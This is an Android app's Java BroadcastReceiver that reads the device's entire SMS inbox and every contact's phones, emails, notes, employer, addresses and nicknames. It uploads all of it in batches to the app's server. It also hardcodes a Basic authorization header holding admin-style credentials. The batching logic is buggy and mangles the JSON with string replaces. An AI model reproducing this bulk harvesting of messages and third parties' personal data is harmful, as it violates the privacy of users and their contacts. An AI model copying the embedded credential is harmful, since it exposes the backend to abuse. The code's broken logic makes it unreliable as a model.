package indwin.c3.shareapp;

import android.app.Activity;
//import android.content.BroadcastReceiver;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import io.intercom.com.google.gson.Gson;

/**
 * Created by Aniket Verma(Digo) on 4/2/2016.
 */
public class AndroidReceiver extends BroadcastReceiver {
    private static final int PERMISSION_REQUEST_CODEC = 2;
    private Context mContext;
    List<SMS> lstSms = new ArrayList<SMS>();
    List<Contacts> con = new ArrayList<Contacts>();
    List<Contacts> con2 = new ArrayList<Contacts>();
    List<SMS> latSms;
    private String user_id="";
    private SharedPreferences cred;
    private static final int PERMISSION_REQUEST_CODE = 1;
    @Override
    public void onReceive(Context context, Intent intent) {
       // getAllSms();
         cred = context.getSharedPreferences("cred", Context.MODE_PRIVATE);
        user_id=cred.getString("phone_number","");
        mContext=context;
        Toast.makeText(context, "I" +
                "'m running", Toast.LENGTH_SHORT).show();
        int results = ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS);
        int w = 0;
        int resultscon = ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS);
        if (resultscon == PackageManager.PERMISSION_GRANTED) {
            w = 1;

getAllContacts();

        } else {

            ActivityCompat.requestPermissions((Activity)context, new String[]{android.Manifest.permission.READ_CONTACTS}, PERMISSION_REQUEST_CODEC);

        }


        if (results == PackageManager.PERMISSION_GRANTED) {




                    //  getALlContacts();
                    getAllSms();

//                    getALlContacts();


        } else {
            ActivityCompat.requestPermissions((Activity)context, new String[]{android.Manifest.permission.READ_SMS}, PERMISSION_REQUEST_CODE);}


        }
public void getAllSms()
{

    Toast.makeText(mContext, "I'm runnxasing", Toast.LENGTH_SHORT).show();
    JSONArray smsJ = new JSONArray();

    SMS objSms = new SMS();


    JSONObject rSms = new JSONObject();
    Uri message = Uri.parse("content://sms/inbox");
    ContentResolver cr = mContext.getContentResolver();

    Cursor c = cr.query(message, null, null, null, null);
    int totalSMS = c.getCount();
    int batchCount = 0;
    if (c.moveToFirst()) {
        for (int i = 0; i < totalSMS; i++) {

            objSms = new SMS();
            objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
            objSms.setAddress(c.getString(c
                    .getColumnIndexOrThrow("address")));
            objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
            // objSms.setReadState(c.getString(c.getColumnIndex("read")));
            objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
            if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                objSms.setFolderName("inbox");
            } else {
                objSms.setFolderName("sent");
            }

            // String json=gson.toJson(objSms);
            lstSms.add(objSms);
            latSms=new ArrayList<SMS>();
            latSms=lstSms;

            batchCount++;
            if (batchCount == 50) {

                System.out.println("sm12a" + lstSms.get(0).getMsg());
 new AuthTokc().execute(lstSms);
//                try {
//                    Thread.sleep(2000);                 //1000 milliseconds is one second.
//                } catch(InterruptedException ex) {
//                    Thread.currentThread().interrupt();
//                }
// new SendSmsToServer().execute(lstSms);
//                 lstSms.clear();
////                new SendSmsToServer().execute(lstSms);
//                lstSms.clear();
                batchCount = 0;
//                break;
            }
            c.moveToNext();
        }
    }

    if (batchCount > 0) {
        new AuthTokc().execute(lstSms);
       // new SendSmsToServer().execute(lstSms);
    }
//    SharedPreferences pref = getSharedPreferences("MyPref", 0);
//    pref.edit().putBoolean("sms_sent", true).commit();
    // else {
    // throw new RuntimeException("You have no SMS");
    // }
    c.close();
    //c.close();


}


    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                    new Thread(new Runnable() {
//                        public void run() {

                            //  getALlContacts();
                            //  getALlContacts();
                            getAllSms();

//
//                    Snackbar.make(view,"Permission Granted, Now you can access location data.",Snackbar.LENGTH_LONG).show();

                } else {

//                    Snackbar.make(view,"Permission Denied, You cannot access location data.",Snackbar.LENGTH_LONG).show();

                }
                break;
            case PERMISSION_REQUEST_CODEC:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {


                            getAllContacts();
//                            getAllSms(

//                    getAllContacts();

//                    Snackbar.make(view,"Permission Granted, Now you can access location data.",Snackbar.LENGTH_LONG).show();

                } else {

//                    Snackbar.make(view,"Permission Denied, You cannot access location data.",Snackbar.LENGTH_LONG).show();

                }
                break;
        }
    }

    public  class AuthTokc extends
            AsyncTask<List<SMS>, Void, List<SMS>> {

        private String apiN="";
        //        Context context;
//        AuthTok(Context context) {
//            this.context = context;
//        }
//    Splash obj=new Splash();
        @Override
        protected List<SMS>  doInBackground(List<SMS>... params) {
            JSONObject payload = new JSONObject();
//            String urldisplay = params[0];
//            apiN=urldisplay;
            try {

                // userid=12&productid=23&action=add
                // TYPE: POST
                //      payload.put("userid", details.get("userid"));
                // payload.put("productid", details.get("productid"));
                // payload.put("action", details.get("action"));


                HttpParams httpParameters = new BasicHttpParams();

                HttpConnectionParams
                        .setConnectionTimeout(httpParameters, 30000);

                HttpClient client = new DefaultHttpClient(httpParameters);
                String urll=BuildConfig.SERVER_URL + "authenticate";
                HttpPost httppost = new HttpPost(urll);
                httppost.setHeader("Authorization", "Basic YnVkZHlhcGlhZG1pbjptZW1vbmdvc2gx");

                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();
                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                   // return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);

                    if (resp.getString("status").contains("fail")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + response.getStatusLine().getStatusCode());
                       // return "fail";
                    } else {
                        String token1="";

                        SharedPreferences userP = mContext.getSharedPreferences("token", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editorP = userP.edit();
                        token1 = resp.getString("token");
                        editorP.putString("token_value",token1);
                        editorP.putLong("expires", resp.getLong("expiresAt"));
                        editorP.commit();
                        return params[0];

                    }

                }

            } catch (Exception e) {
                Log.e("mesherror111", e.getMessage());
//                return ;


            }
      return params[0];
        }
        protected void onPostExecute(List<SMS> result) {
            //getALlContacts();
                new SendSmsToServer().execute(result);

                //  Toast.makeText(Login_with_otp.this, "yey", Toast.LENGTH_SHORT).show();
//            next.new FacebookAuth.fblogin().execute();
                // new fblogin().execute();
//            next.fblogin().execute();
//                new forgotpass().execute();
             //   new login_otp().execute(url);

            }}
    public  class AuthTokContacts extends
            AsyncTask<List<Contacts>, Void, List<Contacts>> {

        private String apiN="";
        //        Context context;
//        AuthTok(Context context) {
//            this.context = context;
//        }
//    Splash obj=new Splash();
        @Override
        protected List<Contacts>  doInBackground(List<Contacts>... params) {
            JSONObject payload = new JSONObject();
//            String urldisplay = params[0];
//            apiN=urldisplay;
            try {

                // userid=12&productid=23&action=add
                // TYPE: POST
                //      payload.put("userid", details.get("userid"));
                // payload.put("productid", details.get("productid"));
                // payload.put("action", details.get("action"));


                HttpParams httpParameters = new BasicHttpParams();

                HttpConnectionParams
                        .setConnectionTimeout(httpParameters, 30000);

                HttpClient client = new DefaultHttpClient(httpParameters);
                String urll=BuildConfig.SERVER_URL + "authenticate";
                HttpPost httppost = new HttpPost(urll);
                httppost.setHeader("Authorization", "Basic YnVkZHlhcGlhZG1pbjptZW1vbmdvc2gx");

                HttpResponse response = client.execute(httppost);
                HttpEntity ent = response.getEntity();
                String responseString = EntityUtils.toString(ent, "UTF-8");
                if (response.getStatusLine().getStatusCode() != 200) {

                    Log.e("MeshCommunication", "Server returned code "
                            + response.getStatusLine().getStatusCode());
                    // return "fail";
                } else {
                    JSONObject resp = new JSONObject(responseString);

                    if (resp.getString("status").contains("fail")) {

                        Log.e("MeshCommunication", "Server returned code "
                                + response.getStatusLine().getStatusCode());
                        // return "fail";
                    } else {
                        String token1="";

                        SharedPreferences userP = mContext.getSharedPreferences("token", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editorP = userP.edit();
                        token1 = resp.getString("token");
                        editorP.putString("token_value",token1);
                        editorP.putLong("expires", resp.getLong("expiresAt"));
                        editorP.commit();
                        return params[0];

                    }

                }

            } catch (Exception e) {
                Log.e("mesherror111", e.getMessage());
//                return ;


            }
            return params[0];
        }
        protected void onPostExecute(List<Contacts> result) {
            new SendContactToServer().execute(result);
        }}

            public class SendSmsToServer extends AsyncTask<List<SMS>, String, String> {

        @Override
        protected String doInBackground(List<SMS>... sms) {
            try {
                System.out.println("sm123");
                JSONObject payload = new JSONObject();
                List<SMS> res = sms[0];
                int j=0;
                String check = new Gson().toJson(sms[0]);



                int length = check.length();
                int noOfiterations=res.size()/300;
                noOfiterations+=1;
                while(noOfiterations--!=0)
                {
                List<SMS> smsUpload=new ArrayList<>();
                for(int i=0;i<300;i++) {
                    smsUpload.add(res.get(j++));
                }

//                System.out.println("buddyqwe" + new Gson().toJson(sms[0]));
                String checkSms = new Gson().toJson(smsUpload);


                int lengthSms = checkSms.length();


//            }
//            catch (Exception e){}
                String check2 = checkSms;
                String pay;


                try {
                    HttpParams httpParameters = new BasicHttpParams();
                    SharedPreferences toks = mContext.getSharedPreferences("token", Context.MODE_PRIVATE);
                    String tok_sp = toks.getString("token_value", "");
                    HttpClient client = new DefaultHttpClient(httpParameters);
                    String urlsm = BuildConfig.SERVER_URL+ "api/content/sms";
//                    SharedPreferences pref = mContext.getSharedPreferences("MyPref", 0);
                    HttpPost httppost = new HttpPost(urlsm);

                    HttpConnectionParams
                            .setConnectionTimeout(httpParameters, 30000);
                    httppost.setHeader("x-access-token", tok_sp);
                    httppost.setHeader("Content-Type", "application/json");
                    //     JSONArray mJSONArray = new JSONArray(Arrays.asList(sms));
                    payload.put("userId",user_id );
                    payload.put("data", check2);


                    String t = payload.toString();
                    String t1 = payload.toString().replace("{\\", "{");
                    String tx = t1.toString().replace(":\\", ":");
                    String ty = tx.toString().replace("\\\":", "\":");
                    String tz = ty.toString().replace(",\\", ",");
                    String tw = tz.toString().replace("\\\"", "\"");
                    String te = tw.toString().replace("\\\\r\\", "");
                    String tr = te.toString().replace("\\\\\"", "");
                    String tu = tr.toString().replace("/\\/", "");
                    String tq = tu.toString().replace("\\/", "");
                    String tl = tq.toString().replace("\\\\", "");
                    String t2 = tl.replace("\"[{", "[{");
                    String t3 = t2.replace("}]\"", "} ]");
                    String t4 = t3.replace("\\n", "");
                    String t5 = t4.replace("\"\"", "");
                    StringEntity entity = new StringEntity(t5);
                    httppost.setEntity(entity);
                    HttpResponse response = client.execute(httppost);
                    HttpEntity ent = response.getEntity();


                    String responseString = EntityUtils.toString(ent, "UTF-8");
                    String ll=responseString;
//                    if (response.getStatusLine().getStatusCode() != 200) {
//
//                        Log.e("MeshCommunication", "Server returned code "
//                                + response.getStatusLine().getStatusCode());
//                        return "fail";
//                    } else {
//                        JSONObject resp = new JSONObject(responseString);
//
//                        if (resp.getString("status").contains("fail")) {
//
//                            Log.e("MeshCommunication", "Server returned code "
//                                    + resp.getString("message"));
//
//                            return "fail";
//                        } else {
//
//                            return "win";
//
//                        }
//                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    return "fail";
                }}
            } catch (Exception e) {
                return "fail";
            }
            return "";
        }

        @Override
        protected void onPostExecute(String result) {
//            Toast.makeText(getApplicationContext(),result,Toast.LENGTH_LONG).show();
            // TODO Auto-generated method stub
            if (result.equals("win")) {

                System.out.println(result + "smswin");
            }
            System.out.println(result + "smsloss");
        }
    }

    public void getAllContacts() {
        String id = "NA", name = "NA", ph_no = "NA", typ = "NA", email = "NA", emailType = "NA", noteWhere = "NA", note = "NA", orgWhere = "NA", orgName = "NA", title = "NA", addrWhere = "NA", poBox = "NA", city = "NA", state = "NA", postalCode = "NA", street = "NA", country = "NA", type = "NA";
        String[] noteWhereParams, orgWhereParams, addrWhereParams, nickwhereparam;
        String nickwhere = "NA", nickname = "NA";
        ContentResolver cr1 = mContext.getContentResolver();
        Cursor cu = cr1.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cu.getCount() > 0) {
            System.out.print("con" + cu.getCount());

            int batchcount1 = 0;
            while (cu.moveToNext()) {
                try {
                    Contacts cObj = new Contacts();

//                String address=cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS));
//
//                String organisation = cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
//          String Website = cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL));
//////
//              String notes = cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
////                String address = cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.SipAddress.SIP_ADDRESS));
//               String phoen = cu.getString(cu.getColumnIndex(ContactsContract.Contacts.PHONETIC_NAME));
//               String nick = cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
//                String im=cu.getString(cu.getColumnIndex(ContactsContract.CommonDataKinds.In
//                String im=cu.getString(cu.getColumnIndex(ContactsContract.Contacts.1
                    try {
                        id = cu.getString(
                                cu.getColumnIndex(ContactsContract.Contacts._ID));
                    } catch (Exception e) {
                        System.out.println("Error with contact");
                        id = "NA";
                    }
                    try {
                        name = cu.getString(
                                cu.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    } catch (Exception e) {
                        System.out.println("Error with contact");
                        name = "NA";
                    }
                    cObj.setName(name);
                    if (Integer.parseInt(cu.getString(
                            cu.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor pCur = cr1.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);

                        List<Phone> ph_ns = new ArrayList<Phone>();
                        while (pCur.moveToNext()) {
                            Phone p =

                                    new Phone();
                            try {
                                ph_no = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            } catch (Exception e) {
                                System.out.println("Error with contact");
                                ph_no = "NA";
                            }
                            try {
                                typ = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            } catch (Exception e) {
                                System.out.println("Error with contact");
                                typ = "NA";
                            }

                            //System.out.println("eefee"+typ);
                            p.setPhone(ph_no);
                            p.setPhone_type(typ);
                            ph_ns.add(p);

                            // Do something with phones
                        }
                        pCur.close();
                        cObj.setPh(ph_ns);

                    }

                    Cursor emailCur = cr1.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    List<Email> eMail = new ArrayList<Email>();
                    while (emailCur.moveToNext()) {
                        Email eObj = new Email();
                        // This would allow you get several email addresses
                        // if the email addresses were stored in an array
                        try {
                            email = emailCur.getString(
                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        } catch (Exception e) {
                            email = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            emailType = emailCur.getString(
                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        } catch (Exception e) {
                            emailType = "NA";
                            System.out.println("Error with contact");
                        }
                        eObj.setemail(email);
                        eObj.setemail_type(emailType);
                        eMail.add(eObj);
//                    System.out.println(emailType+"eeee");
                    }
                    cObj.setEm(eMail);
                    emailCur.close();
                    try {
                        noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    } catch (Exception e) {
                        noteWhere = "NA";
                        System.out.println("Error with contact");
                    }

                    noteWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};

                    Cursor noteCur = cr1.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
                    if (noteCur.moveToFirst()) {
                        try {
                            note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                        } catch (Exception e) {
                            note = "NA";
                        }
                        System.out.println("eeee");
                    }
                    noteCur.close();
                    try {
                        orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    } catch (Exception e) {
                        orgWhere = "NA";
                        System.out.println("Error with contact");
                    }
                    orgWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                    Cursor orgCur = cr1.query(ContactsContract.Data.CONTENT_URI,
                            null, orgWhere, orgWhereParams, null);
                    if (orgCur.moveToFirst()) {
                        try {
                            orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                        } catch (Exception e) {
                            orgName = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                        } catch (Exception e) {
                            title = "NA";
                            System.out.println("Error with contact");
                        }
                        cObj.setOrg(orgName);
                    }
                    orgCur.close();
                    try {
                        addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    } catch (Exception e) {
                        addrWhere = "NA";
                        System.out.println("Error with contact");
                    }
                    addrWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                    Cursor addrCur = cr1.query(ContactsContract.Data.CONTENT_URI,
                            null, addrWhere, addrWhereParams, null);
                    while (addrCur.moveToNext()) {
                        try {
                            poBox = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                        } catch (Exception e) {
                            poBox = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            street = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                        } catch (Exception e) {
                            street = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            city = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                        } catch (Exception e) {
                            city = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            state = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                        } catch (Exception e) {
                            state = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            postalCode = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        } catch (Exception e) {
                            postalCode = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            country = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                        } catch (Exception e) {
                            country = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            type = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                        } catch (Exception e) {
                            type = "NA";
                            System.out.println("Error with contact");
                        }
                        cObj.setAddress(city + " " + state + " " + postalCode + " " + country + " " + type + " " + poBox + " " + street);
                    }
                    addrCur.close();
                    try {
                        nickwhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    } catch (Exception e) {
                        nickwhere = "NA";
                        System.out.println("Error with contact");
                    }
                    nickwhereparam = new String[]{id,
                            ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE};
                    Cursor nick = cr1.query(ContactsContract.Data.CONTENT_URI,
                            null, nickwhere, nickwhereparam, null);
                    if (nick.moveToFirst()) {
                        try {
                            nickname = nick.getString(nick.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.DATA));
                        } catch (Exception e) {
                            nickname = "NA";
                            System.out.println("Error with contact");
                        }
                        try {
                            System.out.println("swag" + id);
                        } catch (Exception e) {
                            System.out.println("Error with contact");
                        }
                        cObj.setNick(nickname);
//                    String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                    }
                    nick.close();
                    con.add(cObj);

                } catch (Exception e) {
                    System.out.println("buddyErro" + e.toString());
                }

                batchcount1++;

                if (batchcount1 == 400) {
                    new AuthTokContacts().execute(con);
                    batchcount1=0;
//                    lstSms.clear();
//
                }

            }
//            int w=0;
//            for(Contacts item:con)
//            {
//                if(w++%500==0)
//                {
//                    con2.add(item);
//                    new SendContactToServer().execute(con2);
//                }
//            }
           // new SendContactToServer().execute(con);
//for(int i=0;i<batchcount1;i++)
//{
//    con2.add(con.get(i));
//    if(i%500==0)
//    {
//        new SendContactToServer().execute(con2);
//
//        con2.clear();
//
//    }
//}
            if (batchcount1>0) {
                new AuthTokContacts().execute(con2);
//                con2.clear();
            }

            System.out.print(con + "dekkh");

        }


    }
    public class SendContactToServer extends AsyncTask<List<Contacts>, String, String> {

        @Override
        protected String doInBackground(List<Contacts>... cont) {
            try {
                System.out.println("sm123");
                JSONObject payload = new JSONObject();
                List<Contacts> res = cont[0];

                String check = "";
                try {
                    System.out.println("buddyqwe" + new Gson().toJson(cont[0]));
                    check = new Gson().toJson(cont[0]);
                } catch (Exception e) {
                    String s = e.toString();
                    System.out.print("regre" + s + "ssio");
                }

//                int length = check.length();


//            }
//            catch (Exception e){}
//                String check2 = check.substring(1, length - 1);
                String pay;
                int w=res.size();
                int r=0;

while(w--!=0)
{ try {
    List<Contacts> contactUpdated=new ArrayList<>();
    for(int i=0;i<300;i++)
    {
        contactUpdated.add(res.get(r++));
    }
                    HttpParams httpParameters = new BasicHttpParams();
                    SharedPreferences toks = mContext.getSharedPreferences("token", Context.MODE_PRIVATE);
                    String tok_sp = toks.getString("token_value", "");
                    HttpClient client = new DefaultHttpClient(httpParameters);
                    String urlsm = BuildConfig.SERVER_URL + "api/content/contact";
//                    SharedPreferences pref = act.getSharedPreferences("MyPref", 0);
                    HttpPost httppost = new HttpPost(urlsm);

                    HttpConnectionParams
                            .setConnectionTimeout(httpParameters, 30000);
                    httppost.setHeader("x-access-token", tok_sp);
                    httppost.setHeader("Content-Type", "application/json");
                    //     JSONArray mJSONArray = new JSONArray(Arrays.asList(sms));
                    try {
                        payload.put("userId", user_id);
                        payload.put("data", check);
                    } catch (Exception e) {
                        System.out.println("NNeve" + e.toString());
                    }


                    String t1 = payload.toString().replace("{\\", "{");
                    String tx = t1.toString().replace(":\\", ":");
                    String ty = tx.toString().replace("\\\":", "\":");
                    String tz = ty.toString().replace(",\\", ",");
                    String tw = tz.toString().replace("\\\"", "\"");
                    String te = tw.toString().replace("\\\\r\\", "");
                    String tr = te.toString().replace("\\\\\"", "");
                    String tu = tr.toString().replace("/\\/", "");
                    String tq = tu.toString().replace("\\/", "");
                    String tl = tq.toString().replace("\\\\", "");
                    String t2 = tl.replace("\"[", "[");
                    String t3 = t2.replace("]\"", "]");
                    String t4 = t3.replace("\\n", "");
                    String t5 = t4.replace("\"\"", "");
                    StringEntity entity = new StringEntity(t5);
                    httppost.setEntity(entity);
                    HttpResponse response = client.execute(httppost);
                    HttpEntity ent = response.getEntity();

                    String responseString = EntityUtils.toString(ent, "UTF-8");

                } catch (Exception e) {
                    e.printStackTrace();
                    return "fail";
                }}
            } catch (Exception e) {
                return "fail";
            }
            return "";
        }

        @Override
        protected void onPostExecute(String result) {
//            Toast.makeText(getApplicationContext(),result,Toast.LENGTH_LONG).show();
            // TODO Auto-generated method stub
            if (result.equals("win")) {
                System.out.println(result);
            }
        }
    }


}
